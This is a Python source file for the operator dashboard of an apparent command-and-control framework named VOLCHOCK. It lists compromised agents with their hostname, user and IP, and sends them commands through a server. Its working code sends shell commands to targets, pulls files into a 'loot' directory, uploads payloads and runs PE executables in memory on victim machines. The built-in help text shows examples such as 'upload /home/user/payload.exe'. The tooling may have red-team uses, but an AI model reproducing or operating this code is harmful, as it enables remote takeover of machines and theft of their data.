import wx
import threading
import os
import time
import base64
from datetime import datetime
import requests

from constants.colors import RED, GRAY, WHITE, INPUT_GRAY
from utils.requests_utils import queue_shell_command

class MainFrame(wx.Frame):
    def __init__(self, base_url, auth, agents):
        super().__init__(parent=None, title="VOLCHOCK CLIENT", size=(900, 600))
        self.SetBackgroundColour(WHITE)
        self.base_url = base_url
        self.auth = auth
        self._agents = agents
        self.last_results = {}
        vbox = wx.BoxSizer(wx.VERTICAL)
        logo_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '.', '..', 'assets', 'logo.jpg'))
        font_path = os.path.abspath(os.path.join(os.path.dirname(__file__), '.', '..', 'assets', 'font.ttf'))
        if os.path.exists(logo_path):
            img = wx.Image(logo_path, wx.BITMAP_TYPE_ANY)
            img = img.Scale(100, 100, wx.IMAGE_QUALITY_HIGH)
            bmp = wx.Bitmap(img)
            if bmp.IsOk():
                logo_bitmap = wx.StaticBitmap(self, bitmap=bmp)
                vbox.Add(logo_bitmap, flag=wx.ALIGN_CENTER | wx.TOP, border=16)
            else:
                vbox.Add(wx.StaticText(self, label="VOLCHOCK"), flag=wx.ALIGN_CENTER | wx.TOP, border=16)
        else:
            vbox.Add(wx.StaticText(self, label="VOLCHOCK"), flag=wx.ALIGN_CENTER | wx.TOP, border=16)
        main_title = wx.StaticText(self, label="VOLCHOCK DASHBOARD")
        main_title.SetForegroundColour(RED)
        if os.path.exists(font_path):
            try:
                wx.Font.AddPrivateFont(font_path)
                font_face_name = "Regular Earth"
                font = wx.Font(28, wx.FONTFAMILY_DEFAULT, wx.FONTSTYLE_NORMAL, wx.FONTWEIGHT_BOLD, False, font_face_name)
                main_title.SetFont(font)
            except Exception as e:
                default_font = main_title.GetFont()
                default_font.SetPointSize(32)
                default_font.SetWeight(wx.FONTWEIGHT_BOLD)
                main_title.SetFont(default_font)
        else:
            default_font = main_title.GetFont()
            default_font.SetPointSize(32)
            default_font.SetWeight(wx.FONTWEIGHT_BOLD)
            main_title.SetFont(default_font)
        vbox.Add(main_title, flag=wx.ALIGN_CENTER_HORIZONTAL | wx.TOP | wx.BOTTOM, border=6)
        splitter = wx.SplitterWindow(self, style=wx.SP_LIVE_UPDATE)
        splitter.SetMinimumPaneSize(50)
        splitter.SetMinSize((900, 150))
        splitter.SetBackgroundColour(GRAY)
        left_panel = wx.Panel(splitter)
        left_panel.SetBackgroundColour(GRAY)
        left_sizer = wx.BoxSizer(wx.VERTICAL)
        self.agent_list = wx.ListBox(
            left_panel,
            choices=[f"{ag['agent_id']} ({ag['hostname']})" for ag in agents]
        )
        self.agent_list.Bind(wx.EVT_LISTBOX, self.on_agent_selected)
        self.agent_list.SetBackgroundColour(INPUT_GRAY)
        self.agent_list.SetForegroundColour(WHITE)
        left_sizer.Add(self.agent_list, 1, wx.EXPAND | wx.ALL, 4)
        left_panel.SetSizer(left_sizer)
        right_panel = wx.Panel(splitter)
        right_panel.SetBackgroundColour(GRAY)
        right_sizer = wx.BoxSizer(wx.VERTICAL)
        margin_panel = wx.Panel(right_panel)
        margin_panel.SetBackgroundColour(INPUT_GRAY)
        margin_sizer = wx.BoxSizer(wx.VERTICAL)
        self.agent_info_panel = wx.Panel(margin_panel)
        self.agent_info_panel.SetBackgroundColour(INPUT_GRAY)
        self.agent_info_sizer = wx.FlexGridSizer(0, 2, 8, 10)
        self.agent_info_panel.SetSizer(self.agent_info_sizer)
        margin_sizer.Add(self.agent_info_panel, 1, wx.EXPAND | wx.ALL, 0)
        margin_panel.SetSizer(margin_sizer)
        right_sizer.Add(margin_panel, 1, wx.EXPAND | wx.ALL, 18)
        right_panel.SetSizer(right_sizer)
        splitter.SplitVertically(left_panel, right_panel, sashPosition=450)
        splitter.SetSize((900, 450))
        splitter.SetSashPosition(450)
        vbox.Add(splitter, 0, wx.EXPAND | wx.ALL, 2)
        cmd_panel = wx.Panel(self)
        cmd_panel.SetBackgroundColour(GRAY)
        cmd_vbox = wx.BoxSizer(wx.VERTICAL)
        self.output = wx.TextCtrl(cmd_panel, style=wx.TE_MULTILINE | wx.TE_READONLY | wx.HSCROLL)
        self.output.SetBackgroundColour(INPUT_GRAY)
        self.output.SetForegroundColour(WHITE)
        cmd_vbox.Add(self.output, 2, wx.EXPAND | wx.LEFT | wx.RIGHT | wx.TOP, 5)
        hbox = wx.BoxSizer(wx.HORIZONTAL)
        self.cmd_txt = wx.TextCtrl(cmd_panel, style=wx.TE_PROCESS_ENTER)
        self.cmd_txt.SetBackgroundColour(INPUT_GRAY)
        self.cmd_txt.SetForegroundColour(WHITE)
        self.cmd_txt.Bind(wx.EVT_TEXT_ENTER, self.on_shell_command)
        self.send_btn = wx.Button(cmd_panel, label="Send")
        self.send_btn.SetForegroundColour(RED)
        self.send_btn.Bind(wx.EVT_BUTTON, self.on_shell_command)
        hbox.Add(self.cmd_txt, 1, wx.EXPAND | wx.ALL, 2)
        hbox.Add(self.send_btn, 0, wx.ALL, 2)
        cmd_vbox.Add(hbox, 0, wx.EXPAND | wx.ALL, 2)
        cmd_panel.SetSizer(cmd_vbox)
        vbox.Add(cmd_panel, 1, wx.EXPAND | wx.ALL, 2)
        self.agent_refresh_timer = wx.Timer(self)
        self.Bind(wx.EVT_TIMER, self.on_auto_refresh, self.agent_refresh_timer)
        self.agent_refresh_timer.Start(5000)
        self.SetSizer(vbox)
        self.Centre()
        if agents:
            self.agent_list.SetSelection(0)
            self.show_agent_info(agents[0])
        else:
            self.clear_agent_info()

    def clear_agent_info(self):
        for child in self.agent_info_panel.GetChildren():
            child.Destroy()
        self.agent_info_sizer.Clear()
        self.agent_info_panel.Layout()

    def on_auto_refresh(self, event):
        try:
            resp = requests.get(f"{self.base_url}/agents", auth=self.auth, timeout=3)
            if resp.ok:
                agents = resp.json().get("agents", [])
                cur_sel = self.agent_list.GetSelection()
                cur_sel_id = None
                if cur_sel != wx.NOT_FOUND and cur_sel < len(self._agents):
                    cur_sel_id = self._agents[cur_sel].get('agent_id', None)
                self._agents = agents
                self.agent_list.Clear()
                self.agent_list.AppendItems([f"{ag['agent_id']} ({ag['hostname']})" for ag in agents])
                sel_index = 0
                if cur_sel_id:
                    for idx, ag in enumerate(agents):
                        if ag.get('agent_id', None) == cur_sel_id:
                            sel_index = idx
                            break
                if agents:
                    self.agent_list.SetSelection(sel_index)
                    self.show_agent_info(agents[sel_index])
                else:
                    self.clear_agent_info()
            else:
                self.output.AppendText(f"[!] Error while refreshing: {resp.status_code}\n")
        except Exception as e:
            self.output.AppendText(f"[!] Exception: {e}\n")

    def on_agent_selected(self, event):
        idx = self.agent_list.GetSelection()
        if idx != wx.NOT_FOUND and idx < len(self._agents):
            self.show_agent_info(self._agents[idx])
        else:
            self.clear_agent_info()

    def show_agent_info(self, agent):
        for child in self.agent_info_panel.GetChildren():
            child.Destroy()
        self.agent_info_sizer.Clear()
        last_seen = agent.get('last_seen', '')
        try:
            last_seen_str = datetime.fromtimestamp(last_seen).strftime('%Y-%m-%d %H:%M:%S') if last_seen else ''
        except:
            last_seen_str = str(last_seen)
        fields = [
            ("ID", agent.get('agent_id', '')),
            ("Hostname", agent.get('hostname', '')),
            ("User", agent.get('username', '')),
            ("IP", agent.get('ip', '')),
            ("Last seen", last_seen_str)
        ]
        label_font = wx.Font(wx.FontInfo(10).Bold())
        for label, value in fields:
            static_label = wx.StaticText(self.agent_info_panel, label=label + " :")
            static_label.SetForegroundColour(WHITE)
            static_label.SetFont(label_font)
            static_value = wx.StaticText(self.agent_info_panel, label=str(value))
            static_value.SetForegroundColour(WHITE)
            self.agent_info_sizer.Add(static_label, 0, wx.ALIGN_LEFT | wx.ALIGN_CENTER_VERTICAL)
            self.agent_info_sizer.Add(static_value, 0, wx.EXPAND)
        self.agent_info_panel.Layout()

    def on_shell_command(self, event):
        selection = self.agent_list.GetSelection()
        if selection == wx.NOT_FOUND or not self._agents:
            self.output.AppendText("[!] Please select an agent.\n")
            self.cmd_txt.SetValue("")
            return
        cmd = self.cmd_txt.GetValue().strip()
        if not cmd:
            self.output.AppendText("[!] Please enter a command.\n")
            self.cmd_txt.SetValue("")
            return
        agent = self._agents[selection]
        agent_id = agent['agent_id']
        if cmd.lower().startswith("shell "):
            payload_cmd = cmd[len("shell "):].strip()
            display_cmd = str({"cmd": f"{payload_cmd}"})
            resp = queue_shell_command(self.base_url, agent_id, display_cmd, self.auth)
            self.output.AppendText(f"[+] Shell command sent: {payload_cmd} \n")
            self.cmd_txt.SetValue("[+] Retrieving command result...")
            wx.Yield()
            threading.Thread(target=self.thread_get_shell_result, args=(agent_id,)).start()
        elif cmd.lower().startswith("download "):
            payload_cmd = cmd[len("download "):].strip()
            display_cmd = str({"download": f"{payload_cmd}"})
            resp = queue_shell_command(self.base_url, agent_id, display_cmd, self.auth)
            self.output.AppendText(f"[+] Trying to download file: {payload_cmd} \n")
            self.cmd_txt.SetValue("[+] Retrieving file data...")
            wx.Yield()
            self.get_downloaded_file(agent_id, payload_cmd)
        elif cmd.lower().startswith("upload "):
            payload_cmd = cmd[len("upload "):].strip()
            with open(payload_cmd, 'rb') as f:
                file_content = f.read()
            b64_encoded_file = base64.b64encode(file_content)
            filename = os.path.basename(payload_cmd)
            fil_props = base64.b64encode(str({"filename": filename, "content": b64_encoded_file}).encode("utf-8", errors="replace"))
            display_cmd = str({"upload": fil_props})
            self.output.AppendText(f"[+] Trying to upload file: {payload_cmd} \n")
            resp = queue_shell_command(self.base_url, agent_id, display_cmd, self.auth)
            self.output.AppendText("[+] File sent.\n")
            threading.Thread(target=self.thread_get_upload_result, args=(agent_id,)).start()
        elif cmd.lower().startswith("exec-pe "):
            cmd_args = cmd[len("exec-pe "):].strip().split(" ")
            payload_cmd = cmd_args[0]
            args = " ".join(cmd_args[1:])
            with open(payload_cmd, 'rb') as f:
                file_content = f.read()
            b64_encoded_file = base64.b64encode(file_content)
            b64_encoded_args = base64.b64encode(args.encode("utf-8", errors="replace"))
            filename = os.path.basename(payload_cmd)
            fil_props = base64.b64encode(str({
                "filename": filename,
                "content": b64_encoded_file,
                "args": b64_encoded_args
            }).encode("utf-8", errors="replace"))
            display_cmd = str({"exec-pe": fil_props})
            self.output.AppendText(f"[+] Trying to execute PE in-memory: {payload_cmd} \n")
            resp = queue_shell_command(self.base_url, agent_id, display_cmd, self.auth)
            self.output.AppendText("[+] PE sent for execution.\n")
            threading.Thread(target=self.thread_get_upload_result, args=(agent_id,)).start()
        else:
            display_help = """
Available Commands:
--------------------
- shell <cmd>
    Execute the specified shell command on the target machine.
    Example: shell whoami

- download <remote_file_path>
    Download a file from the target machine to the server.
    Example: download C:\\Users\\user\\Desktop\\file.txt

- upload <local_file_path>
    Upload a file from the server to the target machine.
    Example: upload /home/user/payload.exe

- exec-pe <local_file_path>
    In-memory execution of a local PE on the target machine.
    Example: exec-pe /home/user/payload.exe
"""
            self.output.AppendText(display_help + "\n")
        self.cmd_txt.SetValue("")

    # THREADING & BACKEND LOGIC
    def thread_get_shell_result(self, agent_id):
        self.get_shell_result(agent_id)
        wx.CallAfter(self.cmd_txt.SetValue, "")

    def get_shell_result(self, agent_id):
        try:
            time_out = 60
            while time_out > 0:
                resp = requests.get(f"{self.base_url}/agent/{agent_id}/results", auth=self.auth, timeout=3)
                if resp.ok:
                    results = resp.json().get("results", [])
                    if len(results) > 0:
                        def show_results():
                            self.output.AppendText(f"\n[Result]:\n")
                            for res in results:
                                self.output.AppendText(f"{res}\n")
                        wx.CallAfter(show_results)
                        return
                time_out = time_out - 1
                time.sleep(1)
            wx.CallAfter(self.output.AppendText, "[!] Timeout, no result received.\n")
        except Exception as e:
            wx.CallAfter(self.output.AppendText, f"[!] Exception: {e}\n")

    def get_downloaded_file(self, agent_id, payload_cmd):
        try:
            time_out = 60
            while time_out > 0:
                resp = requests.get(f"{self.base_url}/agent/{agent_id}/results", auth=self.auth, timeout=3)
                if resp.ok:
                    results = resp.json().get("results", [])
                    if len(results) > 0:
                        latest = results[0]
                        loot_dir = 'loot'
                        if not os.path.exists(loot_dir):
                            os.makedirs(loot_dir)
                        agent_dir = os.path.join('loot', str(agent_id))
                        if not os.path.exists(agent_dir):
                            os.makedirs(agent_dir)
                        filename = os.path.basename(payload_cmd)
                        dest_path = os.path.join(agent_dir, filename)
                        with open(dest_path, 'wb') as f:
                            f.write(base64.b64decode(latest))
                        self.output.AppendText(f"[+] File saved : {dest_path} \n\n")
                        time_out = 0
                        return
                time_out = time_out - 1
                time.sleep(1)
            self.output.AppendText("[!] Timeout, no result received.\n")
        except Exception as e:
            self.output.AppendText(f"[!] Exception: {e}\n")

    def thread_get_upload_result(self, agent_id):
        self.get_upload_result(agent_id)

    def get_upload_result(self, agent_id):
        try:
            time_out = 60
            while time_out > 0:
                resp = requests.get(f"{self.base_url}/agent/{agent_id}/results", auth=self.auth, timeout=3)
                if resp.ok:
                    results = resp.json().get("results", [])
                    if len(results) > 0:
                        return
                time_out = time_out - 1
                time.sleep(1)
        except Exception as e:
            wx.CallAfter(self.output.AppendText, f"[!] Exception: {e}\n")
